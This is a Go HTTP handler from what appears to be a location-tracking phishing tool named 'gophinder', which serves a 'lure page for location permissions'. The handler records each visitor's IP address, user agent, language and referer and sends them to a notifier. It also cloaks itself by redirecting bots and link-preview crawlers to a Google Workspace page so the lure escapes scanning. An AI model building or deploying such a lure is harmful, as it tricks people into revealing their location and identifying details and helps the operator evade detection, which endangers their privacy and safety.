package handler

import (
	"html/template"
	"log"
	"net/http"

	"gophinder/internal/logging"
	"gophinder/internal/notifier"
	"gophinder/utils"
)

// handler to server the lure page for location permissions
// : sends basic info to stdout upon visit
func ServeTemplate(templatePath string, notifier notifier.Notifier) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		userAgent := r.UserAgent()
		ip := utils.GetIP(r)

		if utils.IsBot(userAgent) {
			log.Printf("Blocked bot: %s (%s)", userAgent, ip)
			// used to not only block bots but mask the preview page
			http.Redirect(w, r, "https://workspace.google.com", http.StatusFound) // or serve empty page
			return
		}

		fields := map[string]string{
			"IP Address": ip,
			"User-Agent": userAgent,
			"Language":   r.Header.Get("Accept-Language"),
			"Referer":    r.Referer(),
		}
		logging.LogBlock("Access Log", fields)

		if notifier != nil {
			go notifier.Notify("Location Log", fields)
		}

		tmpl, err := template.ParseFiles(templatePath)
		if err != nil {
			log.Printf("Template error: %v", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		tmpl.Execute(w, nil)
	}
}
